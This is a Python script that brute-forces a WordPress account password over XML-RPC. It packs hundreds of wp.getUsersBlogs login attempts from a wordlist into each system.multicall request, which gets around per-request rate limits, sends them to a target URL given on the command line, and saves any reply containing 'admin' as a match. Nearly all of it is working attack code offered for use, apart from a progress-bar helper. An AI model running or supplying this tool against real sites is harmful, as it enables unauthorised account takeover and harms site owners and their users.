#!/usr/bin/python3

import requests
import sys

MAX_PER_REQUEST = 500

def make_requests(creds: list):
    templates = []
    reqs = []
    for cred in creds:
        usr = cred[0]
        pwd = cred[1]
        templates.append('<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>%s</string></value><value><string>%s</string></value></data></array></value></data></array></value></member></struct></value>' % (usr, pwd))
        if len(templates) == MAX_PER_REQUEST or cred == creds[-1]:
            req = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>%s</data></array></value></param></params></methodCall>' % ''.join(templates)
            templates = []
            reqs.append(req)
    return reqs
        
def check_reply(reply: str):
    if "admin" in reply.lower():
        print("Potential match found!")
        print('======================')
        with open("result.out", 'w') as outfile:
            outfile.write(reply)
        sys.exit(0)

# copied from https://stackoverflow.com/questions/3173320/text-progress-bar-in-terminal-with-block-characters
def progressBar(iterable, prefix = '', suffix = '', decimals = 1, length = 100, fill = '=', printEnd = "\r"):
    """
    Call in a loop to create terminal progress bar
    @params:
        iterable    - Required  : iterable object (Iterable)
        prefix      - Optional  : prefix string (Str)
        suffix      - Optional  : suffix string (Str)
        decimals    - Optional  : positive number of decimals in percent complete (Int)
        length      - Optional  : character length of bar (Int)
        fill        - Optional  : bar fill character (Str)
        printEnd    - Optional  : end character (e.g. "\r", "\r\n") (Str)
    """
    total = len(iterable)
    # Progress Bar Printing Function
    def printProgressBar (iteration):
        percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
        filledLength = int(length * iteration // total)
        bar = fill * filledLength + '-' * (length - filledLength)
        print(f'\r{prefix} [{bar}] {percent}% {suffix}', end = printEnd)
    # Initial Call
    printProgressBar(0)
    # Update Progress Bar
    for i, item in enumerate(iterable):
        yield item
        printProgressBar(i + 1)
    # Print New Line on Complete
    print()

if __name__ == '__main__':
    url = sys.argv[1]     # SET TARGET
    wordlist = sys.argv[2]     # SET CUSTOM WORDLIST
    user = sys.argv[3]    # SET USERNAME TO BRUTE FORCE

    with open(wordlist, 'r') as pwdfile:
        pwds = pwdfile.read().splitlines()
        usrs = [user] * len(pwds)
        d = zip(usrs, pwds)

        reqs = make_requests(list(d))
        count = len(reqs)
        print("request count: %d" % count)

        current = 0
        for req in progressBar(reqs, prefix = 'Progress:', suffix = 'Complete', length = 50):
            r = requests.post(url=url, data=req)
            check_reply(r.text)      

        print("No match found!")